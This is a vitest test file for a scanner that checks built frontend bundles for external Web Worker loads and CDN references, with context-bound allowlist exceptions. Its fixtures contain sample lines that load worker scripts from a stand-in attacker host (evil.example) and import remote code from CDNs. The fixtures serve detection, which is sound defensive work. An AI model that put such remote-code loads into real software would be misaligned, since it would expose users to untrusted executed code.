// WP-KERNEL-009 / MT-027 — FrontendWorkerBundling scanner unit proof.
//
// The full check (`pnpm run check:worker-bundling`,
// app/scripts/check-worker-bundling.mjs) performs the REAL builds and scans
// app/dist + app/dist-harness. This vitest proves the scanner primitives
// themselves are alive — they catch external worker loads and CDN hits in
// negative fixtures, and they do NOT flag the two known benign shapes
// (relative bundled worker URLs; doc-comment URLs near a worker call, e.g.
// the MDN links TypeScript ships inside ts.worker.js).
//
// The built_output_scan_exceptions mechanism (runtime dependency allowlist,
// MT-017 authority) is also pinned here: an exception applies ONLY when its
// required_context_marker sits within max_marker_distance of the hit, so the
// excalidraw ASSETS_FALLBACK_URL exemption cannot widen to arbitrary esm.sh
// references.

import { dirname, join } from "node:path";
import { fileURLToPath } from "node:url";
import { describe, expect, it } from "vitest";
import {
  externalWorkerLoads,
  loadAllowlist,
  partitionCdnHits,
} from "../../../scripts/lib/dependency_policy_scans.mjs";

const repoRoot = join(dirname(fileURLToPath(import.meta.url)), "..", "..", "..", "..");
const allowlist = loadAllowlist(repoRoot);

describe("MT-027 external worker-load detection", () => {
  it("catches literal external worker loads in all three call shapes", () => {
    const fixture = [
      'const a = new Worker("https://evil.example/worker.js");',
      "const b = new SharedWorker('http://evil.example/shared.js');",
      'importScripts("https://cdn.evil.example/lib.js");',
      'const c = new Worker(new URL("https://evil.example/u.js"));',
    ].join("\n");
    const violations = externalWorkerLoads(fixture, "fixture.js");
    expect(violations).toHaveLength(4);
    expect(violations.map((v) => v.url)).toEqual([
      "https://evil.example/worker.js",
      "http://evil.example/shared.js",
      "https://cdn.evil.example/lib.js",
      "https://evil.example/u.js",
    ]);
  });

  it("does not flag bundled-local worker loads or nearby doc URLs", () => {
    const fixture = [
      // The only allowed product shape (Vite ?worker output):
      'const w = new Worker(new URL("./assets/ts.worker-IG6bqgZr.js", import.meta.url));',
      // TypeScript's ts.worker.js ships MDN doc links near importScripts
      // mentions — documentation strings, not loads:
      '{ name: "importScripts", doc: "See https://developer.mozilla.org/docs/Web/API/WorkerGlobalScope/importScripts" },',
      "importScripts(localPath);",
    ].join("\n");
    expect(externalWorkerLoads(fixture, "fixture.js")).toHaveLength(0);
  });
});

describe("MT-027 CDN-hit partitioning with self-verifying exceptions", () => {
  it("flags CDN hosts in built output (tripwire is alive)", () => {
    const { violations, exempted } = partitionCdnHits({
      content: 'fetch("https://cdn.jsdelivr.net/npm/monaco-editor/min/vs/loader.js")',
      relPath: "app/dist/assets/fixture.js",
      pattern: "cdn.jsdelivr.net",
      allowlist,
    });
    expect(violations).toHaveLength(1);
    expect(exempted).toHaveLength(0);
  });

  it("exempts esm.sh ONLY next to the excalidraw ASSETS_FALLBACK_URL marker", () => {
    const marked = partitionCdnHits({
      content: 'Y(vW,"ASSETS_FALLBACK_URL",`https://esm.sh/${pkg}/dist/prod/`);',
      relPath: "app/dist/assets/index-fixture.js",
      pattern: "esm.sh",
      allowlist,
    });
    expect(marked.violations).toHaveLength(0);
    expect(marked.exempted).toHaveLength(1);
    expect(marked.exempted[0].dependency).toBe("@excalidraw/excalidraw");

    const unmarked = partitionCdnHits({
      content: 'import("https://esm.sh/some-package@1.0.0");',
      relPath: "app/dist/assets/index-fixture.js",
      pattern: "esm.sh",
      allowlist,
    });
    expect(unmarked.violations).toHaveLength(1);
    expect(unmarked.exempted).toHaveLength(0);
  });

  it("keeps every documented exception fully justified in the allowlist", () => {
    for (const exc of allowlist.built_output_scan_exceptions ?? []) {
      expect(exc.reason.length).toBeGreaterThan(40);
      expect(exc.required_context_marker.length).toBeGreaterThan(0);
      expect(exc.max_marker_distance).toBeLessThanOrEqual(1000);
      expect(exc.mt).toMatch(/^MT-\d{3}$/);
    }
  });
});
